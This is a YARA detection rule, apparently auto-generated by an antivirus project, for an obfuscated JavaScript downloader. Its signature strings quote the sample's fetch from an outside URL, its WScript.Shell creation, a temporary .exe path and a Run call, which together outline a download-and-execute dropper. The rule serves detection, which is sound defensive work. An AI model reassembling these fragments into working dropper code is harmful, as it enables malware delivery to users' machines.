rule sig_20160401_7b5d51fee197b920df270bb31d384387 {
  meta:
    description = "datamaliciousorder - file 20160401_7b5d51fee197b920df270bb31d384387.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "399b60663ed553c46a56d1e61ee11626113fc62ad429ae08c595d0c8e79fe766"

  strings:
    $s1  = "TgCze[LdgVv](\"G\" + \"ET\", \"http://hotlinehomeappalinces.com/l2osa\", false);" fullword ascii
    $s2  = "var EpgNt = function KnbVn() {return WScript[TvBsa](\"WScript\"+\".Shell\");}(), HzoNr = 11;" fullword ascii
    $s3  = "function SiLsi(UpVl, JioXv){NtDr = NtDr * 1; return UpVl - JioXv;};" fullword ascii
    $s4  = "if (TgCze[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function IovHvp(){return EbqCq + \"\";};" fullword ascii
    $s6  = "function VhjRq() {return EpgNt[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"qGcKmKAeh.ex\" + \"e\";};" fullword ascii
    $s7  = "function SfhKo() {return ((RhQw == true) && (RhQw == PbuTu)) ? 1 : NtDr;};" fullword ascii
    $s8  = "return SiLsi(MxXow, MutNcw);" fullword ascii
    $s9  = "var DzPb = new this[\"Date\"]();" fullword ascii
    $s10 = "RhQw = true; " fullword ascii
    $s11 = "function WhdFqs(EuZwx) {var MzXum = (1, 2, 3, 4, 5, EuZwx); return MzXum;};" fullword ascii
    $s12 = "function QhHdd()" fullword ascii
    $s13 = "var RhQw = false;" fullword ascii
    $s14 = "function DdzNz(){return 23;};" fullword ascii
    $s15 = "}while (EnxJbp);" fullword ascii
    $s16 = "var CgvDh = false;" fullword ascii
    $s17 = "function JpTa(XxpRfp){EpgNt[\"R\"+\"un\"](XxpRfp, NtDr, NtDr);};" fullword ascii
    $s18 = "PbuTu = true; " fullword ascii
    $s19 = "function GqoNt(){return TvBsa;};" fullword ascii
    $s20 = "var PbuTu = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}